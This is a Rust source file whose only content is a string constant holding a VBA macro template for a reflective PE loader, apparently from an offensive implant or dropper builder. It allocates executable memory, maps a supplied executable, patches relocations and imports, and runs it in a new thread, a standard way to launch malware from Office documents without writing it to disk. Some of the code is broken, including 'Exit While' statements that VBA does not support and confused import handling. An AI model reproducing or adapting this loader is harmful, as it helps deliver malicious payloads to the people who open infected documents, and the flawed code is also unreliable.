pub const VBA_PE_LOADER_TEMPLATE: &str = r#"
' PE Loader in VBA
' Based on various RunPE implementations
' Supports x64 only for now

Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long)
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function GetModuleHandleA Lib "kernel32" (ByVal lpModuleName As String) As LongPtr
Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr

' Simplified PE Loader logic
' 1. Allocate memory for image
' 2. Copy headers
' 3. Copy sections
' 4. Perform relocations
' 5. Resolve imports
' 6. Execute entry point

Function PELoader(data() As Byte)
    Dim ntHeaderOffset As Long
    Dim imageBase As LongPtr
    Dim sizeOfImage As Long
    Dim sizeOfHeaders As Long
    Dim entryPoint As Long
    Dim sectionOffset As Long
    Dim numberOfSections As Integer
    Dim i As Integer
    Dim ptr As LongPtr
    
    ' Check MZ signature
    If data(0) <> 77 Or data(1) <> 90 Then Exit Function
    
    ' Get NT Header Offset (e_lfanew at 0x3C)
    RtlMoveMemory VarPtr(ntHeaderOffset), data(60), 4
    
    ' Check PE signature
    If data(ntHeaderOffset) <> 80 Or data(ntHeaderOffset + 1) <> 69 Then Exit Function
    
    ' Get SizeOfImage (OptionalHeader + 56 for x64)
    RtlMoveMemory VarPtr(sizeOfImage), data(ntHeaderOffset + 24 + 56), 4
    
    ' Get SizeOfHeaders (OptionalHeader + 60 for x64)
    RtlMoveMemory VarPtr(sizeOfHeaders), data(ntHeaderOffset + 24 + 60), 4
    
    ' Get EntryPoint (OptionalHeader + 16 for x64)
    RtlMoveMemory VarPtr(entryPoint), data(ntHeaderOffset + 24 + 16), 4
    
    ' Allocate memory
    ptr = VirtualAlloc(0, sizeOfImage, &H1000 Or &H2000, &H40) ' MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
    If ptr = 0 Then Exit Function
    
    ' Copy Headers
    RtlMoveMemory ptr, data(0), sizeOfHeaders
    
    ' Copy Sections
    ' NumberOfSections at FileHeader + 2
    RtlMoveMemory VarPtr(numberOfSections), data(ntHeaderOffset + 4 + 2), 2
    
    ' First Section Header at OptionalHeader + SizeOfOptionalHeader
    Dim sizeOfOptionalHeader As Integer
    RtlMoveMemory VarPtr(sizeOfOptionalHeader), data(ntHeaderOffset + 4 + 16), 2
    sectionOffset = ntHeaderOffset + 24 + sizeOfOptionalHeader
    
    For i = 0 To numberOfSections - 1
        Dim virtualAddress As Long
        Dim sizeOfRawData As Long
        Dim pointerToRawData As Long
        
        ' VirtualAddress at offset 12
        RtlMoveMemory VarPtr(virtualAddress), data(sectionOffset + 12), 4
        ' SizeOfRawData at offset 16
        RtlMoveMemory VarPtr(sizeOfRawData), data(sectionOffset + 16), 4
        ' PointerToRawData at offset 20
        RtlMoveMemory VarPtr(pointerToRawData), data(sectionOffset + 20), 4
        
        If sizeOfRawData > 0 Then
            RtlMoveMemory ptr + virtualAddress, data(pointerToRawData), sizeOfRawData
        End If
        
        sectionOffset = sectionOffset + 40
    Next i
    
    ' Relocations (Base Relocations)
    ' DataDirectory[5] (Base Reloc) at OptionalHeader + 112 + (5 * 8) = +152
    Dim relocRVA As Long
    Dim relocSize As Long
    RtlMoveMemory VarPtr(relocRVA), data(ntHeaderOffset + 24 + 112 + 40), 4
    RtlMoveMemory VarPtr(relocSize), data(ntHeaderOffset + 24 + 112 + 44), 4
    
    If relocRVA > 0 And relocSize > 0 Then
        ' Simplify: Assume no relocations needed if we allocated at preferred base (unlikely)
        ' Implementing full relocations in VBA is tedious.
        ' For Spectre (Rust), it likely has relocations.
        ' We need to process the relocation table.
        
        ' Delta = AllocatedBase - PreferredBase
        Dim preferredBase As LongLong
        RtlMoveMemory VarPtr(preferredBase), data(ntHeaderOffset + 24 + 24), 8
        Dim delta As LongLong
        delta = ptr - preferredBase
        
        Dim currentReloc As Long
        currentReloc = 0
        While currentReloc < relocSize
            Dim pageRVA As Long
            Dim blockSize As Long
            RtlMoveMemory VarPtr(pageRVA), MemoryRead(ptr + relocRVA + currentReloc, 4), 4
            RtlMoveMemory VarPtr(blockSize), MemoryRead(ptr + relocRVA + currentReloc + 4, 4), 4
            
            If blockSize = 0 Then Exit While
            
            Dim numEntries As Long
            numEntries = (blockSize - 8) / 2
            Dim j As Integer
            For j = 0 To numEntries - 1
                Dim entry As Integer
                RtlMoveMemory VarPtr(entry), MemoryRead(ptr + relocRVA + currentReloc + 8 + (j * 2), 2), 2
                
                Dim offset As Integer
                Dim type_ As Integer
                offset = entry And &HFFF
                type_ = (entry And &HF000) / &H1000
                
                If type_ = 10 Then ' IMAGE_REL_BASED_DIR64
                    Dim patchAddr As LongPtr
                    patchAddr = ptr + pageRVA + offset
                    Dim originalVal As LongLong
                    RtlMoveMemory VarPtr(originalVal), MemoryRead(patchAddr, 8), 8
                    Dim newVal As LongLong
                    newVal = originalVal + delta
                    RtlMoveMemory patchAddr, VarPtr(newVal), 8
                End If
            Next j
            
            currentReloc = currentReloc + blockSize
        Wend
    End If
    
    ' Imports
    ' DataDirectory[1] (Import) at OptionalHeader + 112 + 8
    Dim importRVA As Long
    RtlMoveMemory VarPtr(importRVA), data(ntHeaderOffset + 24 + 112 + 8), 4
    
    If importRVA > 0 Then
        Dim importDesc As LongPtr
        importDesc = ptr + importRVA
        
        While True
            Dim nameRVA As Long
            RtlMoveMemory VarPtr(nameRVA), MemoryRead(importDesc + 12, 4), 4
            If nameRVA = 0 Then Exit While
            
            Dim dllName As String
            dllName = ReadCString(ptr + nameRVA)
            Dim hMod As LongPtr
            hMod = GetModuleHandleA(dllName)
            ' If not loaded, LoadLibrary? (VBA LoadLibrary is effectively Declare)
            ' Assume basic DLLs are loaded or use LoadLibraryA via ptr?
            ' For now, assume loaded or use LoadLibrary
            
            Dim thunkRVA As Long
            Dim originalThunkRVA As Long
            RtlMoveMemory VarPtr(thunkRVA), MemoryRead(importDesc + 16, 4), 4
            RtlMoveMemory VarPtr(originalThunkRVA), MemoryRead(importDesc + 0, 4), 4
            If originalThunkRVA = 0 Then originalThunkRVA = thunkRVA
            
            Dim thunkPtr As LongPtr
            Dim originalThunkPtr As LongPtr
            thunkPtr = ptr + thunkRVA
            originalThunkPtr = ptr + originalThunkRVA
            
            While True
                Dim funcRVA As LongLong
                RtlMoveMemory VarPtr(funcRVA), MemoryRead(originalThunkPtr, 8), 8
                If funcRVA = 0 Then Exit While
                
                If (funcRVA And &H8000000000000000^) Then
                    ' Ordinal import
                    ' Not implemented
                Else
                    ' Name import
                    Dim funcNameRVA As Long
                    funcNameRVA = (funcRVA And &H7FFFFFFF) ' Truncate high bits? No, RVA is 32-bit but struct is 64-bit image thunk data
                    ' ImageThunkData64 is u64. AddressOfData is u64.
                    
                    Dim funcNamePtr As LongPtr
                    funcNamePtr = ptr + funcRVA + 2 ' Skip Hint
                    Dim funcName As String
                    funcName = ReadCString(funcNamePtr)
                    
                    Dim funcAddr As LongPtr
                    funcAddr = GetProcAddress(hMod, funcName)
                    RtlMoveMemory thunkPtr, VarPtr(funcAddr), 8
                End If
                
                thunkPtr = thunkPtr + 8
                originalThunkPtr = originalThunkPtr + 8
            Wend
            
            importDesc = importDesc + 20
        Wend
    End If
    
    ' Execute
    CreateThread 0, 0, ptr + entryPoint, 0, 0, 0
End Function

Function MemoryRead(addr As LongPtr, length As Long) As Byte()
    Dim b() As Byte
    ReDim b(length - 1)
    RtlMoveMemory VarPtr(b(0)), addr, length
    MemoryRead = b
End Function

Function ReadCString(addr As LongPtr) As String
    Dim s As String
    Dim b As Byte
    Dim i As Integer
    i = 0
    Do
        RtlMoveMemory VarPtr(b), addr + i, 1
        If b = 0 Then Exit Do
        s = s & Chr(b)
        i = i + 1
    Loop
    ReadCString = s
End Function
"#;
